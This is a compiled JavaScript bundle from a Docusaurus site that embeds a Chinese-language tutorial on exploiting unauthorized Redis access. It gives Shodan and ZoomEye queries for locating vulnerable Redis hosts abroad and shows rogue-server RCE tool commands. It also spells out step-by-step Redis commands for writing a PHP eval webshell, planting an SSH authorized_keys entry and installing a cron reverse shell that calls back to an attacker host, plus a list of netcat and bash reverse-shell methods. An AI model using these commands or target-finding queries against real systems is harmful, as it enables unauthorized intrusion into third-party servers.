"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[5044],{3905:(e,t,r)=>{r.d(t,{Zo:()=>c,kt:()=>k});var n=r(7294);function l(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function s(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function o(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?s(Object(r),!0).forEach((function(t){l(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):s(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function i(e,t){if(null==e)return{};var r,n,l=function(e,t){if(null==e)return{};var r,n,l={},s=Object.keys(e);for(n=0;n<s.length;n++)r=s[n],t.indexOf(r)>=0||(l[r]=e[r]);return l}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)r=s[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(l[r]=e[r])}return l}var a=n.createContext({}),p=function(e){var t=n.useContext(a),r=t;return e&&(r="function"==typeof e?e(t):o(o({},t),e)),r},c=function(e){var t=p(e.components);return n.createElement(a.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},h=n.forwardRef((function(e,t){var r=e.components,l=e.mdxType,s=e.originalType,a=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=p(r),h=l,k=d["".concat(a,".").concat(h)]||d[h]||u[h]||s;return r?n.createElement(k,o(o({ref:t},c),{},{components:r})):n.createElement(k,o({ref:t},c))}));function k(e,t){var r=arguments,l=t&&t.mdxType;if("string"==typeof e||l){var s=r.length,o=new Array(s);o[0]=h;var i={};for(var a in t)hasOwnProperty.call(t,a)&&(i[a]=t[a]);i.originalType=e,i[d]="string"==typeof e?e:l,o[1]=i;for(var p=2;p<s;p++)o[p]=r[p];return n.createElement.apply(null,o)}return n.createElement.apply(null,r)}h.displayName="MDXCreateElement"},1495:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>a,contentTitle:()=>o,default:()=>u,frontMatter:()=>s,metadata:()=>i,toc:()=>p});var n=r(7462),l=(r(7294),r(3905));const s={},o=void 0,i={unversionedId:"\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5",id:"\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5",title:"Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5",description:"\u611f\u8c22\u4ee5\u4e0b\u6587\u7ae0\u548c\u5de5\u5177\uff1a",source:"@site/docs/\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5.md",sourceDirName:"\u6f0f\u6d1e\u590d\u73b0",slug:"/\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5",draft:!1,editUrl:"https://github.com/Adm8n/Adm8n.github.io/tree/gh-pages/docs/\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"\u6f0f\u6d1e\u63cf\u8ff0",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},next:{title:"Win10\u6c38\u6052\u4e4b\u9ed1CVE-2020-0796\u590d\u73b0shell",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/Win10\u6c38\u6052\u4e4b\u9ed1CVE-2020-0796\u590d\u73b0shell"}},a={},p=[{value:"\u901a\u8fc7\u7269\u8054\u7f51\u641c\u7d22\u5f15\u64ce\uff0c\u7b5b\u9009\u51fa\u5b58\u5728 \u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236RCE \u7684 \u76ee\u6807\u89c4\u5219\uff0c",id:"\u901a\u8fc7\u7269\u8054\u7f51\u641c\u7d22\u5f15\u64ce\u7b5b\u9009\u51fa\u5b58\u5728-\u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236rce-\u7684-\u76ee\u6807\u89c4\u5219",level:2},{value:"\u53ea\u9002\u7528\u4e8e redis \u4e3b\u4ece\u590d\u5236RCE\u6f0f\u6d1e \u3002",id:"\u53ea\u9002\u7528\u4e8e-redis-\u4e3b\u4ece\u590d\u5236rce\u6f0f\u6d1e-",level:2},{value:"\u5176\u4ed6\u63d0\u6743\u65b9\u5f0f\u7684\u6761\u4ef6\u8fc7\u591a\uff0c\u5f88\u96be\u8fdb\u884c\u89c4\u5219\u7b5b\u9009\u3002",id:"\u5176\u4ed6\u63d0\u6743\u65b9\u5f0f\u7684\u6761\u4ef6\u8fc7\u591a\u5f88\u96be\u8fdb\u884c\u89c4\u5219\u7b5b\u9009",level:2},{value:"1. \u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236RCE",id:"1-\u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236rce",level:2},{value:"\u6f0f\u6d1e\u539f\u7406",id:"\u6f0f\u6d1e\u539f\u7406",level:3},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0",level:3},{value:"2. \u4e0a\u4f20webshell \u83b7\u53d6\u6743\u9650",id:"2-\u4e0a\u4f20webshell-\u83b7\u53d6\u6743\u9650",level:2},{value:"3. redis\u5bc6\u94a5\u767b\u5f55 ssh",id:"3-redis\u5bc6\u94a5\u767b\u5f55-ssh",level:2},{value:"4.\u5229\u7528\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell",id:"4\u5229\u7528\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell",level:2},{value:"\u5e38\u89c1NC\u83b7\u53d6shell\u7684\u65b9\u6cd5",id:"\u5e38\u89c1nc\u83b7\u53d6shell\u7684\u65b9\u6cd5",level:2},{value:"\u6b63\u5411\u53cd\u5f39shell",id:"\u6b63\u5411\u53cd\u5f39shell",level:4},{value:"\u53cd\u5411\u53cd\u5f39shell",id:"\u53cd\u5411\u53cd\u5f39shell",level:4},{value:"\u65b9\u6cd51\uff1abash\u53cd\u5f39",id:"\u65b9\u6cd51bash\u53cd\u5f39",level:5}],c={toc:p},d="wrapper";function u(e){let{components:t,...r}=e;return(0,l.kt)(d,(0,n.Z)({},c,r,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("p",null,"\u611f\u8c22\u4ee5\u4e0b\u6587\u7ae0\u548c\u5de5\u5177\uff1a\n",(0,l.kt)("a",{parentName:"p",href:"https://kgithub.com/n0b0dyCN/redis-rogue-server"},"GitHub - n0b0dyCN/redis-rogue-server: Redis(<=5.0.5) RCE"),"\n",(0,l.kt)("a",{parentName:"p",href:"https://www.cnblogs.com/-chenxs/p/11748488.html"},"NC\u53cd\u5f39shell\u7684\u51e0\u79cd\u65b9\u6cd5 - ctrl_TT\u8c46 - \u535a\u5ba2\u56ed"),"\n",(0,l.kt)("a",{parentName:"p",href:"https://blog.csdn.net/qq_41210745/article/details/103309137"},"Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u53ca\u9632\u62a4\u63aa\u65bd(\u975e\u5e38\u8be6\u7ec6)_redis\u65e0\u5bc6\u7801\u6267\u884cshell_7Riven\u7684\u535a\u5ba2-CSDN\u535a\u5ba2"),"\n",(0,l.kt)("a",{parentName:"p",href:"https://www.freebuf.com/articles/web/289231.html"},"Redis\u6f0f\u6d1e\u603b\u7ed3 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237")),(0,l.kt)("p",null,"redis \u7684\u9776\u673a\u7684\u6f0f\u6d1e\u590d\u73b0\u7684\u524d\u63d0\u6761\u4ef6\uff1a\nredis\u90fd\u662f\u4f7f\u7528root\u7528\u6237\u8fdb\u884c\u8fd0\u884c\uff0c\u5426\u5219\u5f88\u591a\u4fdd\u5b58\u6587\u4ef6\u7684\u64cd\u4f5c\u65e0\u6cd5\u5b9e\u73b0\uff0c\u4e5f\u5c31\u65e0\u6cd5\u5b9e\u73b0webshell \u4e0a\u4f20\uff0c\u4fee\u6539ssh\u516c\u94a5\uff0c\u4fee\u6539\u8ba1\u5212\u4efb\u52a1\u3002\n\u6240\u4ee5web\u7ad9\u70b9\u51e1\u662f\u4f7f\u7528redis\u4e2d\u95f4\u4ef6,\u90fd\u8981\u8fdb\u884c\u57fa\u7ebf\u68c0\u67e5\u52a0\u56fa\uff0c\u9632\u6b62\u9ed1\u5ba2\u5229\u7528\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u63d0\u6743\uff0c\u9020\u6210\u4e3b\u673a\u5931\u9677\u3002"),(0,l.kt)("h1",{id:"\u4e00\u76ee\u6807\u63a2\u6d4b"},"\u4e00\u3001\u76ee\u6807\u63a2\u6d4b"),(0,l.kt)("h2",{id:"\u901a\u8fc7\u7269\u8054\u7f51\u641c\u7d22\u5f15\u64ce\u7b5b\u9009\u51fa\u5b58\u5728-\u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236rce-\u7684-\u76ee\u6807\u89c4\u5219"},"\u901a\u8fc7\u7269\u8054\u7f51\u641c\u7d22\u5f15\u64ce\uff0c\u7b5b\u9009\u51fa\u5b58\u5728 \u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236RCE \u7684 \u76ee\u6807\u89c4\u5219\uff0c"),(0,l.kt)("h2",{id:"\u53ea\u9002\u7528\u4e8e-redis-\u4e3b\u4ece\u590d\u5236rce\u6f0f\u6d1e-"},"\u53ea\u9002\u7528\u4e8e redis \u4e3b\u4ece\u590d\u5236RCE\u6f0f\u6d1e \u3002"),(0,l.kt)("ol",null,(0,l.kt)("li",{parentName:"ol"},(0,l.kt)("strong",{parentName:"li"},"zoomeye\uff08\u949f\u9997\u4e4b\u773c\uff09"),(0,l.kt)("ul",{parentName:"li"},(0,l.kt)("li",{parentName:"ul"},'port:"6379" +country:"\u65e5\u672c" +app:"Redis key-value store" +Banner:"redis_version:5.0.3"'),(0,l.kt)("li",{parentName:"ul"},'port:"6379" +app:"Redis key-value store" +Banner:"redis_version:5.0.5" -country:"CN" +after:"2023-01-01" +country:"JP" ')))),(0,l.kt)("p",null,"Banner \u662f\u901a\u8fc7\u62a5\u6587\u56de\u590d\u5185\u5bb9\uff0c\u7b5b\u9009\u51fa\u5173\u952e\u5b57\uff0c\u9632\u6b62\u7a7a\u519b\uff0c\u5e76\u4e14\u8fc7\u6ee4\u6389\u5173\u95ed\u672a\u6388\u6743\u8bbf\u95ee\u7684redis\u4e3b\u673aip\u3002\u4ece\u800c\u5b9e\u73b0\u7cbe\u51c6\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\uff0c\u8fdb\u884c\u5b9e\u64cd\u3002"),(0,l.kt)("ol",{start:2},(0,l.kt)("li",{parentName:"ol"},(0,l.kt)("strong",{parentName:"li"},"shodan"))),(0,l.kt)("p",null,'port:"6379" product:"Redis key-value store" version:"5.0.4" -country:"CN"\nport:"6379" product:"Redis key-value store" version:"5.0.3" -country:"CN"\nport:"6379" product:"Redis key-value store" version:"5.0.2" -country:"CN"'),(0,l.kt)("h2",{id:"\u5176\u4ed6\u63d0\u6743\u65b9\u5f0f\u7684\u6761\u4ef6\u8fc7\u591a\u5f88\u96be\u8fdb\u884c\u89c4\u5219\u7b5b\u9009"},"\u5176\u4ed6\u63d0\u6743\u65b9\u5f0f\u7684\u6761\u4ef6\u8fc7\u591a\uff0c\u5f88\u96be\u8fdb\u884c\u89c4\u5219\u7b5b\u9009\u3002"),(0,l.kt)("h1",{id:"\u4e8c\u591a\u79cd\u6f0f\u6d1e\u539f\u7406"},(0,l.kt)("strong",{parentName:"h1"},"\u4e8c\u3001\u591a\u79cd\u6f0f\u6d1e\u539f\u7406")),(0,l.kt)("h2",{id:"1-\u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236rce"},"1. \u8fdc\u7a0b\u4e3b\u4ece\u590d\u5236RCE"),(0,l.kt)("h3",{id:"\u6f0f\u6d1e\u539f\u7406"},"\u6f0f\u6d1e\u539f\u7406"),(0,l.kt)("p",null,"\u6f0f\u6d1e\u5b58\u5728\u4e8e4.x\u30015.x\u7248\u672c\u4e2d\uff0cRedis\u63d0\u4f9b\u4e86\u4e3b\u4ece\u6a21\u5f0f\uff0c\u4e3b\u4ece\u6a21\u5f0f\u6307\u4f7f\u7528\u4e00\u4e2aredis\u4f5c\u4e3a\u4e3b\u673a\uff0c\u5176\u4ed6\u7684\u4f5c\u4e3a\u5907\u4efd\u673a\uff0c\u4e3b\u673a\u4ece\u673a\u6570\u636e\u90fd\u662f\u4e00\u6837\u7684\uff0c\u4ece\u673a\u8d1f\u8d23\u8bfb\uff0c\u4e3b\u673a\u53ea\u8d1f\u8d23\u5199\uff0c\u901a\u8fc7\u8bfb\u5199\u5206\u79bb\u53ef\u4ee5\u5927\u5e45\u5ea6\u51cf\u8f7b\u6d41\u91cf\u7684\u538b\u529b\uff0c\u7b97\u662f\u4e00\u79cd\u901a\u8fc7\u727a\u7272\u7a7a\u95f4\u6765\u6362\u53d6\u6548\u7387\u7684\u7f13\u89e3\u65b9\u5f0f\u3002\u5728redis 4.x\u4e4b\u540e\uff0c\u901a\u8fc7\u5916\u90e8\u62d3\u5c55\u53ef\u4ee5\u5b9e\u73b0\u5728redis\u4e2d\u5b9e\u73b0\u4e00\u4e2a\u65b0\u7684Redis\u547d\u4ee4\uff0c\u901a\u8fc7\u5199c\u8bed\u8a00\u5e76\u7f16\u8bd1\u51fa.so\u6587\u4ef6\u3002\u5728\u4e24\u4e2aRedis\u5b9e\u4f8b\u8bbe\u7f6e\u4e3b\u4ece\u6a21\u5f0f\u7684\u65f6\u5019\uff0cRedis\u7684\u4e3b\u673a\u5b9e\u4f8b\u53ef\u4ee5\u901a\u8fc7FULLRESYNC\u540c\u6b65\u6587\u4ef6\u5230\u4ece\u673a\u4e0a\u3002\u7136\u540e\u5728\u4ece\u673a\u4e0a\u52a0\u8f7d\u6076\u610fso\u6587\u4ef6\uff0c\u5373\u53ef\u6267\u884c\u547d\u4ee4\u3002"),(0,l.kt)("h3",{id:"\u6f0f\u6d1e\u590d\u73b0"},"\u6f0f\u6d1e\u590d\u73b0"),(0,l.kt)("p",null,"redis-rogue-server\u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a",(0,l.kt)("a",{parentName:"p",href:"https://github.com/n0b0dyCN/redis-rogue-server"},"https://github.com/n0b0dyCN/redis-rogue-server"),"\n\u8be5\u5de5\u5177\u65e0\u6cd5\u5bf9Redis\u5bc6\u7801\u8fdb\u884cRedis\u8ba4\u8bc1\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u5de5\u5177\u53ea\u9002\u5408\u76ee\u6807\u5b58\u5728Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u65f6\u4f7f\u7528\u3002\u5982\u679c\u5b58\u5728\u5bc6\u7801\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u8fd9\u4e2a\u5de5\u5177\u3002\nAwsome-Redis-Rogue-Server\u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a",(0,l.kt)("a",{parentName:"p",href:"https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server"},"https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server"),"\n\u6267\u884c\u53cd\u5f39\npython3 redis-rogue-server.py -rhost \uff08\u9776\u673aIP\uff09 -lhost \uff08\u53cd\u5f39shell IP\uff09\n",(0,l.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/2T6KQSEZljboJys.jpg",alt:null})),(0,l.kt)("p",null,"\u9009\u62e9\u4ea4\u4e92\u5f0f\u7684shell(interactive shell) \u6216\u8005\u53cd\u5f39shell(reserve shell)\uff0c\u8fd9\u91cc\u9009\u62e9\u7684\u662f\u4ea4\u4e92\u5f0f\uff1b\u82e5\u662f\u9009\u62e9\u53cd\u5f39\u7684\u5982\u4e0b\uff1a"),(0,l.kt)("p",null,(0,l.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/LRvIhOJzBnsD2Eq.jpg",alt:null})),(0,l.kt)("p",null,"\u8fd9\u90e8\u5206\u7684\u7f3a\u70b9\u5c31\u662f\u53ea\u9002\u7528\u4e8e\u76ee\u6807\u673a\u5668\u5141\u8bb8\u8fdc\u7a0b\u767b\u5f55\u7684\u65f6\u5019\uff0c\u5982\u679c\u76ee\u6807\u673a\u5b50\u53ea\u5141\u8bb8\u672c\u5730\u767b\u5f55\uff0c\u5219\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5c31\u4e0d\u884c\u4e86\uff0c\u6b64\u65f6\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u6f0f\u6d1e\uff0c\u4ece\u76ee\u6807\u672c\u5730\u767b\u5f55redis\u3002"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u83b7\u53d6\u6743\u9650\u540e\u4f7f\u7528\u53cd\u5f39shell,\u8fde\u63a5\u653b\u51fb\u673a\uff0c")),(0,l.kt)("p",null,"bash -i >& /dev/tcp/(LHOST IP)/9999 0>&1\nnc -lvnp 9999"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"./redis-rce.py -r \uff08\u76ee\u6807IP\uff09 -L \uff08\u53cd\u5f39IP\uff09 -f ./exp.so")),(0,l.kt)("h2",{id:"2-\u4e0a\u4f20webshell-\u83b7\u53d6\u6743\u9650"},"2. \u4e0a\u4f20webshell \u83b7\u53d6\u6743\u9650"),(0,l.kt)("p",null,"\u9776\u673a\u5f00\u542f\u7740web\u670d\u52a1\u5b58\uff0c\u5e76\u4e14\u662f\u9ed8\u8ba4web\u76ee\u5f55\u7684\u8def\u5f84\uff0c\u5e76\u4e14\u5177\u6709\u8bfb\u5199\u589e\u5220\u6539\u67e5\u7684\u6743\u9650\u3002\n\u5373\u53ef\u901a\u8fc7redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u4e0a\u4f20webshell\u6587\u4ef6\uff0c\u4f7f\u7528\u8fdc\u7a0b\u8fde\u63a5\u5de5\u5177\u8681\u5251\u8fbe\u5230\u63a7\u5236\u670d\u52a1\u5668\u7684\u76ee\u7684\u3002"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-php"},"config set dir /var/www/html/ \n  //\u5207\u6362\u5230\u7f51\u7ad9\u7684\u6839\u76ee\u5f55\nconfig set dbfilename shell.php\n  //\u5728\u78c1\u76d8\u4e2d\u751f\u6210\u6728\u9a6c\u6587\u4ef6\nset xxx \"\\n\\n\\n<?php @eval($_POST['pass']);?>\\n\\n\\n\" \n  //\u5199\u5165\u6076\u610f\u4ee3\u7801\u5230\u5185\u5b58\u4e2d\uff0c\u8fd9\u91cc\u7684\\n\\n\\n\u4ee3\u8868\u6362\u884c\u7684\u610f\u601d\uff0c\u7528redis\u5199\u5165\u6587\u4ef6\u7684\u4f1a\u81ea\u5e26\u4e00\u4e9b\u7248\u672c\u4fe1\u606f\uff0c\u5982\u679c\u4e0d\u6362\u884c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u6267\u884c.\nsave\n  //\u5c06\u5185\u5b58\u4e2d\u7684\u6570\u636e\u5bfc\u51fa\u5230\u78c1\u76d8\nconfig get dir\n  //\u5373\u53ef\u67e5\u770b\u4fdd\u5b58\u8def\u5f84 \uff0c\u786e\u4fdd\u8def\u5f84\u65e0\u8bef\n")),(0,l.kt)("p",null,(0,l.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/zs5ojku8IZOwCpX.jpg",alt:null})),(0,l.kt)("h2",{id:"3-redis\u5bc6\u94a5\u767b\u5f55-ssh"},"3. redis\u5bc6\u94a5\u767b\u5f55 ssh"),(0,l.kt)("p",null,"\u6f0f\u6d1e\u539f\u7406\uff1a\n\u5728\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u4e00\u6761\u6570\u636e\uff0c\u5c06\u672c\u673a\u7684\u516c\u94a5\u4f5c\u4e3avalue\uff0ckey\u503c\u968f\u610f\u3002\u7136\u540e\u901a\u8fc7\u4fee\u6539\u9776\u673aredis\u4fdd\u5b58\u76ee\u5f55\uff0c\u9ed8\u8ba4\u8def\u5f84\u4e3a/root/.ssh \u548c\u9ed8\u8ba4authorized_keys\u7684\u516c\u94a5\u503c\uff0c\u5b9e\u73b0\u653b\u51fb\u8005\u7684\u8fdc\u7a0b\u767b\u5f55\u3002"),(0,l.kt)("blockquote",null,(0,l.kt)("p",{parentName:"blockquote"},"authorized_keys\n\u5f53\u5ba2\u6237\u7aef\u5c1d\u8bd5\u8fde\u63a5\u5230\u670d\u52a1\u5668\u65f6\uff0c\u670d\u52a1\u5668\u4f1a\u68c0\u67e5\u5ba2\u6237\u7aef\u63d0\u4f9b\u7684\u79c1\u94a5\u662f\u5426\u4e0e\u5176\u5728 authorized_keys \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u516c\u94a5\u5339\u914d")),(0,l.kt)("p",null,'\u6f0f\u6d1e\u590d\u73b0\uff1a\nroot # ssh-keygen -t rsa\n// \u653b\u51fb\u673ashell \u751f\u6210\u672c\u673a\u7684ssh\u516c\u94a5,\u9ed8\u8ba4\u4fdd\u5b58\u4f4d\u7f6e\u4e3a /root/.ssh/\nroot # cd /root/.ssh/\nroot # echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt\nroot # cat key.txt'),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-php"},"cat key.txt | redis-cli -h \u9776\u673aIP -x set xxx   \n//-x \u4ee3\u8868\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u6570\u636e\u4f5c\u4e3a\u8be5\u547d\u4ee4\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u3002key\uff1axxx\uff0cvalue:\u516c\u94a5\u3002\n\n\u767b\u5f55redis \u5f00\u59cb\u4fee\u6539\u516c\u94a5\u6587\u4ef6\nconfig set dir /root/.ssh\nconfig set dbfilename authorized_keys\nsave      //ok\u5373\u53ef\nconfig get dir\n//\u5373\u53ef\u67e5\u770b\u4fdd\u5b58\u8def\u5f84 \uff0c\u786e\u4fdd\u8def\u5f84\u65e0\u8bef\n")),(0,l.kt)("p",null,"\u653b\u51fb\u8005\u5f00\u59cb\u8fde\u63a5\u9776\u673a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"ssh -i id_rsa root@(\u9776\u673aIP)\n\u6216\u8005\nssh (\u9776\u673aIP)\n")),(0,l.kt)("h2",{id:"4\u5229\u7528\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell"},"4.\u5229\u7528\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell"),(0,l.kt)("p",null,"\u5728\u5927\u591a\u6570 Linux \u7cfb\u7edf\u4e2d\uff0c\u5305\u62ec Ubuntu\u3001Debian \u548c CentOS\uff0ccrontab \u7684\u9ed8\u8ba4\u884c\u4e3a\u7c7b\u4f3c\u3002\n\u4f8b\u5982\uff0c\u5b83\u4eec\u901a\u5e38\u4f7f\u7528 Vixie cron \u6216 systemd-cron \u4f5c\u4e3a cron \u5b88\u62a4\u8fdb\u7a0b\uff0c\u5e76\u628a\u7528\u6237\u7684 crontab \u6587\u4ef6\u5b58\u50a8\u5728 /var/spool/cron/crontabs \u76ee\u5f55\u6216\u8005 /var/spool/cron\u4e2d\u3002\ncentos\u7684\u5b9a\u65f6\u4efb\u52a1\u76ee\u5f55\u5728/var/spool/cron/\u76ee\u5f55\u4e0b\uff0c\nkali\u548cubuntu\u7684\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u5728/var/spool/cron/crontabs\u76ee\u5f55\u4e0b\n\u5229\u7528Redis\u672a\u6388\u6743\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5199\u5165\u6587\u4ef6\u5230\u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1\u76ee\u5f55 /var/spool/cron\u4e0b\u6765\u6267\u884c\u3002\n\u653b\u51fb\u8005\u5148\u5f00\u59cbnc\u4fa6\u542c\uff1a root#nc -lvp 7777\n\u8fde\u63a5redis,\u5199\u5165\u53cd\u5f39shell"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},'set xx "\\n* * * * * bash -i >& /dev/tcp/192.168.190.129/7777 0>&1\\n"\n//\u661f\u53f7\u8868\u793a\u7684\u662f\u8ba1\u5212\u4efb\u52a1\u7684\u65f6\u95f4\nconfig set dir /var/spool/cron/   //\u6216\u8005 /var/spool/cron/crontabs \nconfig set dbfilename root     // \u8ba1\u5212\u4efb\u52a1\u7684\u6587\u4ef6\u540d\u4e3aroot\nsave   // ok\nconfig get dir\n//\u5373\u53ef\u67e5\u770b\u4fdd\u5b58\u8def\u5f84 \uff0c\u786e\u4fdd\u8def\u5f84\u65e0\u8bef\n')),(0,l.kt)("p",null,"\u672a\u9a8c\u8bc1\uff1aroot\u6587\u4ef6\u7684\u6743\u9650\u5fc5\u987b\u4e3a600\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\ncron","[53948]",": (root) INSECURE MODE (mode 0600 expected)"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u56db\u3001\u5f52\u7eb3\u603b\u7ed3")),(0,l.kt)("p",null,(0,l.kt)("a",{parentName:"p",href:"https://www.bilibili.com/video/BV1Fd4y1T7pD/?spm_id_from=333.337.search-card.all.click&vd_source=37d64b600e2e9290d1199375863307b6"},"\u3010\u8da3\u8bddRedis\u7b2c\u4e00\u5f39\u3011\u6211\u662fRedis\uff0cMySQL\u5927\u54e5\u88ab\u6211\u5751\u60e8\u4e86\uff01_\u54d4\u54e9\u54d4\u54e9_bilibili"),"\n\u8fd9\u4e2a\u89c6\u9891\u5e2e\u52a9\u6211\u5feb\u901f\u8ba4\u8bc6redis \uff0credis\u4e0e\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u4ee5\u53caredis \u54e8\u5175\u6a21\u5f0f\u548c\u9ad8\u53ef\u7528\u6027\u7684\u5de5\u4f5c\u539f\u7406\u3002"),(0,l.kt)("h2",{id:"\u5e38\u89c1nc\u83b7\u53d6shell\u7684\u65b9\u6cd5"},"\u5e38\u89c1NC\u83b7\u53d6shell\u7684\u65b9\u6cd5"),(0,l.kt)("h4",{id:"\u6b63\u5411\u53cd\u5f39shell"},"\u6b63\u5411\u53cd\u5f39shell"),(0,l.kt)("p",null,"ubuntu\u6216\u8005CentOS\u4e0a\u9762\u8f93\u5165"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-php"},"nc -lvp 7777 -e /bin/bash\n")),(0,l.kt)("p",null,"kali\u4e0a\u8f93\u5165"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-php"},"nc ip 7777\n")),(0,l.kt)("p",null,"\u6b63\u5411\u53cd\u5f39\u662f\u76ee\u6807\u673a\u5148\u6267\u884cnc\u547d\u4ee4\uff0c\u7136\u540ekali\u4e0a\u518d\u8fdb\u884cnc\u76d1\u542c\uff0c\u5373\u53ef\u53cd\u5f39shell\u3002\n\u9700\u8981\u76ee\u6807\u673a\u5b89\u88c5nc\u3002"),(0,l.kt)("h4",{id:"\u53cd\u5411\u53cd\u5f39shell"},"\u53cd\u5411\u53cd\u5f39shell"),(0,l.kt)("h5",{id:"\u65b9\u6cd51bash\u53cd\u5f39"},"\u65b9\u6cd51\uff1abash\u53cd\u5f39"),(0,l.kt)("p",null,"bash -i >& /dev/tcp/ip/port 0>&1\n\u4f46\u9996\u5148\u9700\u8981\u5728kali\u4e0a\u4f7f\u7528nc\u76d1\u542c\u7aef\u53e3\uff1a\nnc -lvp 7777\n\u6b64\u65b9\u6cd5\u5728ubuntu\u4e0b\u4e0d\u4f1a\u53cd\u5f39\u6210\u529f\uff0cCentOS\u53ef\u4ee5\u53cd\u5f39\u6210\u529f\u3002"),(0,l.kt)("p",null,'alias t="./redis-rogue-server.py  --lhost 1 --rhost"\nalias c="./redis-rce.py -L -f exp.so -r "'))}u.isMDXComponent=!0}}]);